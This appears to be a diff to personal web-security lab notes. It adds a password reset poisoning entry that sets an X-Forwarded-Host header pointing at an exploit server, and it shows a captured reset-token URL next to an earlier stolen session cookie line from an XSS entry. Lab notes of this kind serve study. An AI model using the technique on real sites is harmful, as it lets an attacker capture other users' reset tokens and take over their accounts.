@@ -82,3 +82,13 @@ XSS
 
 /secret=T88cI38wn5zNcV3RIgyxp6qZayCMm1FG;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
 
+# Password reset poisoning via middleware
+
+```
+While processing forgot password set new header:
+X-Forwarded-Host: exploit-server 
+It will process Host Header Injection
+```
+
+/forgot-password?temp-forgot-password-token=qsh1gvoveepzfygxccgv5rzdelnn4tl2
+
